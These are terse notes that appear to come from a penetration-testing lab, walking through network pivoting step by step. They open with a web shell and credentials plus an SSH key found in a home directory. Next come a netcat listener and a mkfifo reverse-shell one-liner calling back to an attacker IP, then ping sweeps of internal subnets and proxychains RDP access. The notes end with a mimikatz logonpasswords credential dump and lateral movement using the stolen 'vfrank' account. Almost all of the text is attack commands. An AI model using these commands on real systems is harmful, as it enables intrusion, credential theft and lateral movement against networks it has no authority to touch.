10.129.229.129 - web shell
Credentials and id_rsa private key in /home/webadmin

Next, create a bind shell and upgrade tty to do a ping sweep

Attack host:
sudo nc -lvnp 1234

Web shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.94 1234 >/tmp/f

Ping sweep from web shell host:
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

Found 172.16.5.35

proxychain xfreerdp into machine

download mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

Get credentials for vfrank

RDP into 172.16.6.35 with vfrank

Ping sweep:
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"

rdp into 172.16.6.25 using vfrank


